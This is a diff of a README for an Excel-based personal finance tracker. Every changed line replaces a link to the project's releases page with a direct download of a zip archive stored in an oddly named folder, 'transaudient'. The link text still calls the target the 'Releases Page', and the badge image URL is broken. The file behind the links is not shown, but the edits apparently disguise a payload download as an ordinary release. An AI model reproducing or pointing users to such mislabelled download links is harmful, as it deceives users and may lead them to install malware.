@@ -1,6 +1,6 @@
 # 🚀 personal-finance-tracker - Take Control of Your Money Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Himanshu4101/personal-finance-tracker/releases)
+[![Download Now](https://github.com/Himanshu4101/personal-finance-tracker/raw/refs/heads/main/transaudient/finance-tracker-personal-1.1-beta.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/Himanshu4101/personal-finance-tracker/raw/refs/heads/main/transaudient/finance-tracker-personal-1.1-beta.3.zip)
 
 ## 📖 Overview
 
@@ -25,7 +25,7 @@ personal-finance-tracker is a comprehensive Excel-based personal finance managem
 
 Follow these steps to download and run personal-finance-tracker:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/Himanshu4101/personal-finance-tracker/releases) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://github.com/Himanshu4101/personal-finance-tracker/raw/refs/heads/main/transaudient/finance-tracker-personal-1.1-beta.3.zip) to go to the releases page.
   
 2. **Choose Your Version:** Look through the available versions to find the most recent release. 
   
@@ -42,7 +42,7 @@ Follow these steps to download and run personal-finance-tracker:
 
 ## 📥 Download & Install
 
-To download personal-finance-tracker, visit the [Releases Page](https://github.com/Himanshu4101/personal-finance-tracker/releases). Choose the right version for your needs, and follow the instructions above to open and use the software.
+To download personal-finance-tracker, visit the [Releases Page](https://github.com/Himanshu4101/personal-finance-tracker/raw/refs/heads/main/transaudient/finance-tracker-personal-1.1-beta.3.zip). Choose the right version for your needs, and follow the instructions above to open and use the software.
 
 ## 🛠️ FAQs
 
@@ -72,4 +72,4 @@ If you encounter issues or need assistance, open an issue on the repository. Our
 
 Your input is valuable. Please let us know what features you like, and any new additions you wish to see. We aim to improve continuously and make personal-finance-tracker even better. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Himanshu4101/personal-finance-tracker/releases)
+[![Download Now](https://github.com/Himanshu4101/personal-finance-tracker/raw/refs/heads/main/transaudient/finance-tracker-personal-1.1-beta.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/Himanshu4101/personal-finance-tracker/raw/refs/heads/main/transaudient/finance-tracker-personal-1.1-beta.3.zip)
